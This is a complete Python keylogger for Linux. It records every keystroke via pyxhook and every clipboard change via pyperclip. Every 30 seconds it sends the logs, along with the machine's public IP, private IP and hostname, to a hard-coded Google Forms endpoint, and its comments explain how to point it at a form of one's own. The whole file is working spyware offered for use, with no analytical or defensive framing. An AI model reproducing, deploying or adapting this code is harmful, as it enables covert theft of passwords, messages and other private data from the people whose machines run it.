#!/usr/bin/python3

import os
import time
import socket
import pyxhook
import requests
import datetime
import pyperclip
import multiprocessing


# Edit the url also edit fields in post_form function
google_form_url = "https://docs.google.com/forms/d/e/1FAIpQLSdX1isUEfIf3rI2efwZwkucW73HAvlPXuXqQJ4udzvlWg_d7w/formResponse"

# customize the time (in secs)
wait_time_to_post = 30
wait_time_to_listen_clip = 1

keys_lock = ''
clip_lock = ''

log_keys_file = os.environ.get(
	'zero-key-score-key',
	os.path.expanduser('/tmp/file_keys.log')
)

log_clip_file = os.environ.get(
	'zero-key-score-clip',
	os.path.expanduser('/tmp/file_clip.log')
)


def get_private_ip():
	return ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
	if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
	s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
	socket.SOCK_DGRAM)]][0][1]]) if l][0][0])



def WriteToFile(filename, msg):
	with open(filename, 'a') as f:
		f.write('{} '.format(msg))


def OnKeyPress(event):
	global keys_lock
	keys_lock.acquire()
	WriteToFile(log_keys_file, event.Key)
	keys_lock.release()


def listen_key():
	hook = pyxhook.HookManager()
	hook.KeyDown = OnKeyPress
	hook.HookKeyboard()
	try:
		hook.start()
	except Exception as e:
		msg = 'Error while catching events:\n {}'.format(e)
		keys_lock.acquire()
		WriteToFile(log_keys_file, msg)
		keys_lock.release()


def listen_clip():
	global clip_lock
	content = ''
	while True:
		new_content = pyperclip.paste().strip()
		if content != new_content:
			clip_lock.acquire()
			WriteToFile(log_clip_file, new_content + '\n')
			clip_lock.release()
			content = new_content
		time.sleep(wait_time_to_listen_clip)


def post_form():
	global keys_lock, clip_lock
	while True:
		time.sleep(wait_time_to_post)

		# Get public IP address
		public_ip = requests.get('https://api.ipify.org').text
		# Get private IP address
		private_ip = get_private_ip()
		# Get hostname
		hostname = socket.gethostname()

		keys_lock.acquire()
		clip_lock.acquire()

		# Read keys, clip from the file
		with open(log_keys_file, 'r') as file:
			keys = file.read()
		with open(log_clip_file, 'r') as file:
			clip = file.read()

		print('keys:\n', keys)
		print('clip:\n', clip)

		if keys == '':
			print('Empty thing')
			return

		# Edit the entry.<id> fields to match you google form.
		data = {
			"entry.745369685": public_ip,
			"entry.1437673380": private_ip,
			"entry.904649455": hostname,
			"entry.1598571516": keys,
			"entry.1456833776": clip,
		}

		print('Trying to write to form:\n', data)
		try:
			res = requests.post(google_form_url, data)
			print(res)
			# Clear file
			open(log_keys_file, 'w').close()
			open(log_clip_file, 'w').close()
		except Exception as e:
			WriteToFile(log_key_file, str(e))
			print('Error: ', str(e))
		finally:
			keys_lock.release()
			clip_lock.release()



def initialize_files():
	global keys_lock, clip_lock

	# Lock variable for accessing files
	keys_lock = multiprocessing.Lock()
	clip_lock = multiprocessing.Lock()

	timestamp = "Timestamp: " + str(datetime.datetime.now())
	WriteToFile(log_keys_file, timestamp + '\n')
	WriteToFile(log_clip_file, timestamp + '\n')


if __name__ == '__main__':
	initialize_files()

	# For Key Strokes
	p1 = multiprocessing.Process(target=listen_key)
	# For clipboard cotent
	p2 = multiprocessing.Process(target=listen_clip)
	# For filling form
	p3 = multiprocessing.Process(target=post_form)

	p1.start()
	p2.start()
	p3.start()

#	This never happens because both processes are infinite
	p1.join()
	p2.join()
	p3.join()

	print('This doesn\'t print probably!')
